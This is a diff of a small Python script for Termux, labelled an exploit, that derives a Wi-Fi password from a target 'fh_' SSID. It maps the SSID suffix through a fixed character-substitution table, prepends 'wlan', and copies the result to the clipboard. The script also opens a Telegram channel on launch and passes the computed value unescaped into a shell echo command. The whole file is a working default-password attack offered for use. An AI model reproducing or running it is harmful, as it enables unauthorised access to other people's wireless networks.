@@ -1,7 +1,6 @@
 import os, time, urllib.request
 
 # --- [ CONFIG ] ---
-# تم تحديث الرابط إلى حسابك الجديد
 TELEGRAM_LINK = "https://t.me/m_oha0_2b" 
 
 G = '\033[1;32m' # Green
@@ -11,7 +10,7 @@ Y = '\033[1;33m' # Yellow
 R = '\033[1;31m' # Red
 C = '\033[1;36m' # Cyan
 
-# Full Bidirectional Mapping for FH (Corrected)
+# Full Bidirectional Mapping for FH
 MAP = {
     'e':'1', '1':'e', 'd':'2', '2':'d',
     'c':'3', '3':'c', 'b':'4', '4':'b',
@@ -21,7 +20,7 @@ MAP = {
 
 def banner():
     os.system("clear")
-    # فتح الرابط الجديد تلقائياً
+    # Open Channel automatically
     os.system(f"termux-open-url {TELEGRAM_LINK}")
     
     print(f"{G}")
@@ -39,14 +38,14 @@ def banner():
 
 def start_exploit():
     banner()
-    print(f"{Y}[*] SYSTEM READY. Waiting for SSID...")
-    ssid = input(f"{G}[#] Target SSID (e.g., fh_5d620): {W}")
+    print(f"{Y}[*] SYSTEM READY...")
+    ssid = input(f"{G}[#] Target SSID: {W}")
     
     if "fh_" in ssid.lower():
         print(f"{B}[*] Running Bidirectional Algorithm...")
         time.sleep(1.2)
         
-        # Calculation
+        # Calculation Logic
         suffix = ssid.lower().split("fh_")[-1]
         password = "wlan" + "".join([MAP.get(c, c) for c in suffix])
         
@@ -58,11 +57,11 @@ def start_exploit():
         
         # Auto-copy to clipboard
         os.system(f"echo '{password}' | termux-clipboard-set")
-        print(f"{Y}[!] Password copied! Paste it in your WiFi settings.")
+        print(f"{Y}[!] Password copied to clipboard.")
         
     else:
-        print(f"{R}[!] Error: Please enter a valid FH SSID.")
-        time.sleep(2)
+        print(f"{R}[!] Error: Target not supported.")
+        time.sleep(1.5)
         start_exploit()
 
 if __name__ == "__main__":
